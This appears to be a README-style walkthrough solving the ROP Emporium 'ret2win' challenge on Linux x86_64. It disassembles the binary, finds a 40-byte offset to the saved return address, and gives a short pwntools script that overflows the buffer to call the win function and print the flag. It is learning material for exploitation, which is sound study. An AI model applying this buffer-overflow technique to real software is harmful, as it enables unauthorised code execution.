## ROP Emporium Solutions

## What is ROP Emporium?

[ROP Emporium](https://ropemporium.com/) is a place to learn return-oriented programming through a series of challenges. Return-oriented programming (ROP) is a mechanism that can be leveraged to bypass exploit mitigation schemes such as NX/DEP. The ROP Emporium challenges are available in 4 different architectures; x86, x86_64, ARMv5 & MIPS. We will be using Linux x86_64 architecture.

## Challenge 1 --> ret2win

We try to execute the binary and passing some input to it: 
![image](https://github.com/user-attachments/assets/cd134ff6-f2bc-431f-8f4b-8b47c860f20b)

It returns the message "Thank you!" and exits. Let's dive into the binary internals. We use the following command to view the assembly code --> `objdump -M intel -d ret2win | less`

We can see three interesting functions. The "main" function, a function called "pwnme", and the "ret2win" function:

![image](https://github.com/user-attachments/assets/952290d7-af84-4a6d-a952-c8635e613176)

![image](https://github.com/user-attachments/assets/7c908601-8701-4fd9-8545-7f228060c06a)

![image](https://github.com/user-attachments/assets/2d1c7b54-d14a-4344-8316-5a4d93a45d64)

We need to find a way to jumping to the "ret2win" function, so this function prints the content of flag.txt

We search for a crash:

![image](https://github.com/user-attachments/assets/ccda25c5-913f-4287-94c7-e204da26b363)

And we send the input to the binary:

![image](https://github.com/user-attachments/assets/cc03c6fb-b240-4496-a3c3-a471f6a63f04)

We check for the value in "RBP" register:

![image](https://github.com/user-attachments/assets/b81faa47-1944-4dda-93cc-7c152e834980)

Furthermore, we can overwrite the RIP with 32+8 = 40 bytes.

We write the exploit:

```py
from pwn import *

p = process("./ret2win")

filler = b"A" * 40
ret2win = 0x400756

payload = filler + p64(ret2win)

p.send(payload)
p.interactive()
```

After execute it we receive the flag:

![image](https://github.com/user-attachments/assets/5ae1251c-8ef7-4179-ae0e-d976275b4a9f)


